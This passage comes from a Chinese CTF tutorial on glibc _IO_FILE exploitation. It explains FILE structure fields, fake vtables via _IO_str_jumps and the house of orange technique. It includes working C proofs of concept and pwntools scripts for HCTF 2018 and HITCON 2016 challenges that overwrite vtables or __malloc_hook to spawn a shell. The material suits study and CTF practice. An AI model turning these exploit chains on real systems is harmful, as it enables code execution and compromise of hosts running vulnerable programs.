     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```

### Exploit with FILENO

当 vtable 不能被利用了，那么就该想办法在 `_IO_FILE` 结构体找利用方法。`_IO_FILE` 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 `fwrite`、`fread` 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。因为进程中包含了系统默认的三个文件流 stdin、stdout、stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf、printf 一样可以进行利用。在 `_IO_FILE` 中 `_IO_buf_base` 表示操作的起始地址，`_IO_buf_end` 表示结束地址，通过控制这两个数据可以实现控制读写的操作：

```cpp
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

在没有执行任何输出函数之前，`_IO_2_1_stdin_` 结构体如下：

```
pwndbg> p/x _IO_2_1_stdin_
$1 = {
  file = {
    _flags = 0xfbad2088,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7ffff7dd3790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd19c0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7ffff7dd06e0
}
```

调用 `scanf` 之类的函数后可以看到 `_IO_read_ptr`、`_IO_read_base`、`_IO_read_end`、`_IO_buf_base`、`_IO_buf_end` 等域都被初始化。而且可以看出来初始化后的内存是在堆上分配的，可以看到输入的数据，且大小是 0x400 个字节，正好是 `_IO_buf_base` 到 `_IO_buf_end` 的大小：

```
pwndbg> p/x _IO_2_1_stdin_
$2 = {
  file = {
    _flags = 0xfbad2288,
    _IO_read_ptr = 0x602013,
    _IO_read_end = 0x602014,
    _IO_read_base = 0x602010,
    _IO_write_base = 0x602010,
    _IO_write_ptr = 0x602010,
    _IO_write_end = 0x602010,
    _IO_buf_base = 0x602010,
    _IO_buf_end = 0x602410,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7ffff7dd3790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd19c0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7ffff7dd06e0
}
pwndbg> x/10gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000411
0x602010:	0x000000000a333231	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
```

那么如果修改 `_IO_buf_base` 和 `_IO_buf_end` 到某个目标地址地址，就能修改掉目标地址的数据：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define _IO_2_1_stdin_addr 0x7ffff7dd18e0

char buf[100] = "This is the Original Buffer.";

int main() {
    char stack_buf[100];
    void *fake_buf_base = (uint64_t)buf;
    void *fake_buf_end = (uint64_t)buf + 100;
    void *ptr = _IO_2_1_stdin_addr;
    *(uint64_t *)((uint64_t)ptr + 0x38) = fake_buf_base;
    *(uint64_t *)((uint64_t)ptr + 0x40) = fake_buf_end;

    scanf("%s", stack_buf);
    printf("%s\n", buf);
    return 0;
}
```

### Hijack `_IO_str_jumps`（<= glibc-2.28）

libc 中不仅仅只有 `_IO_file_jumps` 这个 vtable，还有一个叫做 `_IO_str_jumps`。而这个 vtable 不在 check 范围之内。如果我们能设置文件指针的 vtable 为 `_IO_str_jumps` 么就能调用不一样的文件操作函数：

```cpp
const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

#### `_IO_str_jumps->overflow`

在修改了 vtable 之后，可以劫持 `_IO_str_overflow` 来劫持程序流程：

```cpp
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
```

其中通过以下几个条件来绕过：

1. `fp->_flags & _IO_NO_WRITES` 为假；
   - 构造 `_flags = 0`；
2. `fp->_IO_write_ptr - fp->_IO_write_base >= _IO_blen (fp) + flush_only` 为真（`#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)`）；
   - 构造 `_IO_write_base = 0`、`_IO_write_ptr = 0x7fffffffffffffff` 以及 `_IO_buf_end = (bin_sh_in_libc_addr - 100) / 2`（`&"/bin/sh"` 需要是一个偶数）；
3. `fp->_flags & _IO_USER_BUF` 为假；
4. `2 * _IO_blen (fp) + 100` 不能为负数，且指向 `"/bin/sh"` 字符串对应的地址；
5. `*((_IO_strfile *) fp)->_s._allocate_buffer`（`fp + 0xe0`）指向 system 地址。

即最后执行下面这句语句：

```cpp
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

测试代码如下（环境为 glibc-2.24）：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define libc_base 0x7ffff7a4e000
#define _IO_2_1_stdin_addr libc_base+0x3878c0
#define _IO_str_jumps_addr libc_base+0x384500
#define bin_sh_in_libc_addr libc_base+0x14fc3d
#define system_addr libc_base+0x3c971

int main() {
    FILE *fp;
    char *bin_sh_on_stack_addr = "/bin/sh";
    fp = _IO_2_1_stdin_addr;//fopen("1.txt", "rw");
    if (!fp) {
        printf("file not existed.\n");
        exit(-1);
    }
    *(uint64_t *)((uint64_t)fp) = 0; // _flags
    *(uint64_t *)((uint64_t)fp + 0x20) = 0; // _IO_write_base
    *(uint64_t *)((uint64_t)fp + 0x28) = 0x7fffffffffffffff; // _IO_write_ptr
    *(uint64_t *)((uint64_t)fp + 0x40) = ((uint64_t)bin_sh_on_stack_addr - 100) / 2; // _IO_buf_end
    *(uint64_t *)((uint64_t)fp + 0xe0) = system_addr;
    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable
    exit(0);
}
```

#### `_IO_str_jumps->finish`

同理在 `_IO_str_finish` 中也可以绕过：

```cpp
void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

绕过条件如下：

1. `fp->_IO_buf_base` 不为空；
2. `fp->_flags & _IO_USER_BUF` 为假；
   - 构造 `_flags = 0`、`_IO_buf_base = bin_sh_in_libc_addr`；
3. `((_IO_strfile *) fp)->_s._free_buffer`（`fp + 0xe8`）指向 system 地址。

测试代码如下（环境为 glibc-2.24）：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define libc_base 0x7ffff7a4e000
#define _IO_2_1_stdin_addr libc_base+0x3878c0
#define _IO_str_jumps_addr libc_base+0x384500
#define bin_sh_in_libc_addr libc_base+0x14fc3d
#define system_addr libc_base+0x3c971

int main() {
    FILE *fp;
    fp = _IO_2_1_stdin_addr;//fopen("1.txt", "rw");
    if (!fp) {
        printf("file not existed.\n");
        exit(-1);
    }
    *(uint64_t *)((uint64_t)fp) = 0; // _flags
    *(uint64_t *)((uint64_t)fp + 0x38) = bin_sh_in_libc_addr; // _IO_buf_base
    *(uint64_t *)((uint64_t)fp + 0xe8) = system_addr;
    *(uint64_t *)((uint64_t)fp + 0xd8) = _IO_str_jumps_addr; // vtable
    fclose(fp);
    return 0;
}
```

# 2018-HCTF-the_end

程序除了 Canary 其他保护全开了。一开始给了 libc 基址，然后可以改 5 个字节，最后 exit 退出：

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  sleep(0);
  printf("here is a gift %p, good luck ;)\n", &sleep);
  fflush(_bss_start);
  close(1);
  close(2);
  for ( i = 0; i <= 4; ++i )
  {
    read(0, &buf, 8uLL);
    read(0, buf, 1uLL);
  }
  exit(1337);
}
```

因为最后的 exit 会调用到 vtable 中的 setbuf，所以只需要改这个指针就行。方法就是找一个假的 vtable，然后在把对应偏移处的地址改为 one_gadget。又因为只能修改 5 个字节，3 个字节用来修改 one_gadget，2 个字节来改 vtable，所以假的 vtable 原始的高 6 字节要跟原来的一样，而对应的 setbuf 偏移处的值得是一个 libc 上的地址：

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./the_end')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p.recvuntil('here is a gift ')
libc_base = int(p.recv(14)[2:], 16) - libc.symbols['sleep']
info('libc_base = ' + hex(libc_base))
exit = libc_base + libc.symbols['exit']
one_gadget = libc_base + one_gadgets[1]
vtable = libc_base + libc.symbols['stderr'] - 8
info('vtable = ' + hex(vtable))
fake_vtable = libc_base + 0x3c5588
fake_setbuf = fake_vtable + 0x58

#gdb.attach(p)

p.recvuntil(', good luck ;)')
for i in range(2):
    p.send(p64(vtable + i))
    p.send(p64(fake_vtable)[i])
for i in range(3):
    p.send(p64(fake_setbuf + i))
    p.send(p64(one_gadget)[i])

info('one_gadget = ' + hex(one_gadget))
p.sendline('exec /bin/sh 1>&0')
p.interactive()
```

# 2018-HCTF-baby_printf_ver2

程序除了 Canary 其他保护全开。一开始会提供一个 buffer 的指针。然后往 buffer 上读数据。最后会检查 stdout 的 `_flags` 字段是否被修改，如果被改了就会再被改回来。最后输出 buffer 中的值：

```cpp
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r13
  FILE *v4; // r14
  char buf; // [rsp+3h] [rbp-35h]
  int i; // [rsp+4h] [rbp-34h]
  unsigned __int64 v7; // [rsp+8h] [rbp-30h]

  v7 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  puts("Welcome to babyprintf_v2.0");
  puts("heap is too dangrous for printf :(");
  __printf_chk(1LL, (__int64)"So I change the buffer location to %p\n", (__int64)buffer);
  puts("Have fun!");
  v3 = *(_QWORD *)&stdout[1]._flags;
  while ( 1 )
  {
    i = 0;
    while ( 1 )
    {
      read(0, &buf, 1uLL);
      buffer[i] = buf;
      if ( buffer[i] == '\n' )
        break;
      if ( ++i > 0x1ff )
        goto LABEL_6;
    }
    buffer[i] = 0;
LABEL_6:
    v4 = stdout;
    if ( *(_QWORD *)&stdout[1]._flags != v3 )
    {
      write(1, "rewrite vtable is not permitted!\n", 0x21uLL);
      *(_QWORD *)&v4[1]._flags = v3;
    }
    __printf_chk(1LL, (__int64)buffer, 0xdeadbeefuLL);
  }
}
```

经过调试发现 buffer 就在 stdout 的前 0x10 的位置。虽然不能修改原来的 stdout，但是我们可以覆盖 stdout 的指针，创建一个新的 stdout 结构体。在调试的时候获取相关的一些结构体成员：

```
pwndbg> p/x _IO_2_1_stdout_
$1 = {
  file = {
    _flags = 0xfbad2887,
    _IO_read_ptr = 0x7ffff7dd26a3,
    _IO_read_end = 0x7ffff7dd26a3,
    _IO_read_base = 0x7ffff7dd26a3,
    _IO_write_base = 0x7ffff7dd26a3,
    _IO_write_ptr = 0x7ffff7dd26a3,
    _IO_write_end = 0x7ffff7dd26a3,
    _IO_buf_base = 0x7ffff7dd26a3,
    _IO_buf_end = 0x7ffff7dd26a4,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7dd18e0,
    _fileno = 0x1,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0xa},
    _lock = 0x7ffff7dd3780,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd17a0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7ffff7dd06e0
}
```

伪造 stdout 中的成员泄漏 vtable 来获取 libc，然后把 malloc_hook 改成 one_gadget，最后想办法在最后的 printf_chk 处触发 malloc。利用 [veritas501 写的 FILE 模块](https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#FILE-py-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E4%BC%AA%E9%80%A0%E6%A8%A1%E5%9D%97)来构造 `_IO_FILE` 结构体：

```python
#!/usr/bin/env python
from pwn import *
from FILE import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./babyprintf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil('So I change the buffer location to ')
buffer_addr = int(p.recvuntil('\n', drop=True)[2:], 16)
binary_base = buffer_addr - 0x202010
info('buffer_addr = ' + hex(buffer_addr))
p.recvuntil('Have fun!\n')

def leak(addr):
    fake_file = IO_FILE_plus_struct()
    fake_file._flags = 0x00000000fbad2887
    fake_file._IO_read_end = addr
    fake_file._IO_write_base = addr
    fake_file._IO_write_ptr = addr + 8
    fake_file._fileno = 1
    fake_file._lock = buffer_addr + 0x100
    payload = 'A' * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]
    p.sendline(payload)
    p.recvline()
    return u64(p.recv(8))

def write(addr, data):
    while data != 0:
        fake_file = IO_FILE_plus_struct()
        fake_file._flags = 0x00000000fbad2887
        fake_file._IO_read_end = buffer_addr
        fake_file._IO_buf_base = addr
        fake_file._fileno = 1
        fake_file._lock = buffer_addr + 0x100
        payload = 'A' * 0x10 + p64(buffer_addr + 0x20) + p64(0) + str(fake_file)[:-8]
        p.sendline(payload)
        p.sendline(chr(data & 0xff))
        addr += 1
        data >>= 8

vtable_addr = buffer_addr + 0xf8
libc_base = leak(vtable_addr) - libc.symbols['_IO_file_jumps']
info('libc_base = ' + hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_gadgets[1]
#gdb.attach(p)
write(malloc_hook, one_gadget)

p.sendline('%66666c')
p.recvuntil('\x7f')
p.interactive()
```

# 2016-HITCON-houseoforange

通过 sysmalloc 构造 Free Chunk 的过程不过多叙述，主要是记录 IO_FILE 的利用。程序保护全开，流程大概如下。有建 House、升级 House、查看 House 三个功能：

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int c; // eax

  sub_1218();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      c = read_int();
      if ( c != 2 )
        break;
      see();
    }
    if ( c > 2 )
    {
      if ( c == 3 )
      {
        upgrade();
      }
      else
      {
        if ( c == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( c != 1 )
        goto LABEL_14;
      build();
    }
  }
}
```

涉及到的结构体有 House 还有 Orange：

```cpp
struct orange {
  int price;
  int color;
};

struct house {
  struct orange *org;
  char *name;
};
```

各个函数中大概是只能 Build 三次，每次只能 Upgrade 两次。其中在 Upgrade 时是重新输入 Name 的长度来读取，且只要小于 0x1000 就行，所以有 Heap Overflow：

```cpp
int upgrade()
{
  struct orange *org; // rbx
  unsigned int len; // [rsp+8h] [rbp-18h]
  signed int color_id; // [rsp+Ch] [rbp-14h]

  if ( times > 2u )
    return puts("You can't upgrade more");
  if ( !houses )
    return puts("No such house !");
  printf("Length of name :");
  len = read_int();
  if ( len > 0x1000 )
    len = 0x1000;
  printf("Name:");
  read_buf(houses->name, len);
  printf("Price of Orange: ", len);
  org = houses->org;
  org->price = read_int();
  color_menu();
  printf("Color of Orange: ");
  color_id = read_int();
  if ( color_id != 0xDDAA && (color_id <= 0 || color_id > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( color_id == 0xDDAA )
    houses->org->color = 0xDDAA;
  else
    houses->org->color = color_id + 30;
  ++times;
  return puts("Finish");
}
```

其中读 Name 时，用 read 来读，不会给 buf 后面补 0，所以可以泄漏出后面的内容：

```cpp
ssize_t __fastcall read_buf(void *buf, unsigned int len)
{
  ssize_t result; // rax

  result = read(0, buf, len);
  if ( (signed int)result > 0 )
    return result;
  puts("read error");
  exit(1);
  return result;
}
```

然后这里利用 IO_FILE 的思路大概如下，利用 Unsortedbin Attack 的特性，下次 malloc 的时候，程序会调用 `malloc_printeer` 输出错误信息，最终一层层调用到 vtable 中的 `_IO_overflow_t`：

```
 +--------------------+
 | malloc_printerr    |
 +--------------------+
            |
            v
 +--------------------+
 | __libc_message     |
 +--------------------+
            |
            v
 +--------------------+
 | abort              |
 +--------------------+
            |
            v
 +--------------------+
 | _IO_flush_all_lockp|
 +--------------------+
            |
            v
 +--------------------+
 | _IO_overflow_t     |
 +--------------------+
```

在 `_IO_flush_all_lockp` 中，最终我们要执行 `_IO_OVERFLOW (fp, EOF)`，故要构造好 vtable 来改掉 `_IO_OVERFLOW`。前面的条件判断部分用 `||` 分为两部分，满足任一即可，（这里是 libc-2.23，根据前面 libc-2.24 及以后的版本的 IO_FILE 利用可以得出相应的 House-of-Orange 的做法）：

```cpp
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

- 条件 1 构造如下：
  - `fp->_mode = 0`（`fp->_mode <= 0`）
  - `fp->_IO_write_ptr = 1 ; fp->_IO_write_base = 0`（`fp->_IO_write_ptr > fp->_IO_write_base`）
- 条件 2 构造如下（具体查看 `_IO_wide_data` 结构体）：
  - `fp->_mode = 1`（`fp->_mode > 0`）
  - `fp->_wide_data->_IO_write_ptr = _IO_read_end ; fp->_wide_data->_IO_write_base = _IO_read_ptr`（`fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`）

接下来利用 Unsortedbin-Attack 将 `_IO_list_all` 的值改到 Unsortedbin 的位置（把这里当成 `_IO_2_1_stderr`）。然后在 Unsortedbin 上构造好一个大小为 0x60 的 Smallbin Chunk，同时在这里伪造一个能够 Bypass 的 IO_FILE 结构体。这样 `_IO_list_all` 的 `_chain` 就会指到这个地址的偏移 0x68 处（即 0x60 的 Smallbin），又指向我们在堆上构造的 IO_FILE（这里借用 veritas501 的图）：

```txt
 +0x00 [       top        |  last_remainder   ]
 +0x10 [ unsorted bin fd  |  unsorted bin bk  ]
 +0x20 [ smallbin 0x20 fd | smallbin 0x20 bk  ]
 +0x30 [ smallbin 0x30 fd | smallbin 0x30 bk  ]
 +0x40 [ smallbin 0x40 fd | smallbin 0x40 bk  ]
 +0x50 [ smallbin 0x50 fd | smallbin 0x50 bk  ]
 +0x60 [ smallbin 0x60 fd | smallbin 0x60 bk  ] /* 0x68 */
```

说实话最后一步一层一层调试还是很复杂的，而且如果调不到 one_gadget 都判断不了 ESP 的值对不对。最后总算是调出来了：

```python
#!/usr/bin/env python
from pwn import *
from FILE import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

def cmd(c):
    p.recvuntil('Your choice :')
    p.sendline(str(c))

def build(length, name, price, color):
    cmd(1)
    p.recvuntil('Length of name :')
    p.sendline(str(length))
    p.recvuntil('Name :')
    p.send(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(price))
    p.recvuntil('Color of Orange:')
    p.sendline(str(color))

def see():
    cmd(2)

def upgrade(length, name, price, color):
    cmd(3)
    p.recvuntil('Length of name :')
    p.sendline(str(length))
    p.recvuntil('Name:')
    p.send(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(price))
    p.recvuntil('Color of Orange:')
    p.sendline(str(color))

def giveup():
    cmd(4)

p = process('./houseoforange')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

build(0x28, '1' * 8, 1, 1)
upgrade(0x60, '2' * 0x40 + p64(0) + p64(0xf91), 1, 1) # Overflow top chunk
build(0x1000, '3' * 0x8, 1, 1) # Trigger sysmalloc
build(0x500, '4' * 0x8, 1, 1) # Get a chunk from Unsorted-bin
see() # Leak Unsorted-bin ptr
p.recvuntil('4' * 0x8)
offset = 0x7fc27d99a188 - 0x7fc27d5d5000
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - offset
info('libc_base = ' + hex(libc_base))
if libc_base & 0xffffffff < 0x80000000:
    warning('LOWWORD(libc_base) < 0')
    p.close()
    exit(-1)
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_gadgets[3]

upgrade(0x500, '5' * 0x10, 1, 1)
see()
p.recvuntil('5' * 0x10)
heap_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - 0xd0
info('heap_base = ' + hex(heap_base))

io_list_all = libc_base + libc.symbols['_IO_list_all']
fake_file = IO_FILE_plus_struct()
fake_file._IO_read_ptr = 0x61 # Small-bin size
fake_file._IO_read_base = io_list_all - 0x10 # Small-bin's bk ; Unsorted-bin Attack
fake_file._mode = 0
fake_file._IO_write_ptr = 1
fake_file._IO_write_base = 0
fake_file.vtable = heap_base + 0x6e0
payload = '6' * 0x500 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)
payload += str(fake_file) # heap_base + 0x600
payload += '\x00' * 0x18 + p64(one_gadget)
info('one_gadget = ' + hex(one_gadget))
#gdb.attach(p, 'dir ~/glibc-2.23/malloc\nb _int_malloc' + '\nc' * 6)
#gdb.attach(p, 'dir ~/glibc-2.23/libio\nb __libc_message\nb abort\nc')
upgrade(0x800, payload, 1, 1)
cmd(1)
p.interactive()
```

> House of Orange 并不是百分之百成功的，只有在 libc_base 的低 32 位为负数时才能成功，见[这篇文章](https://www.anquanke.com/post/id/168802#h3-7)。

# References

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/
https://ctftime.org/writeup/12124
https://dangokyo.me/2017/12/13/hitcon-2016-ctf-quals-house-of-orange-write-up/
https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py
http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
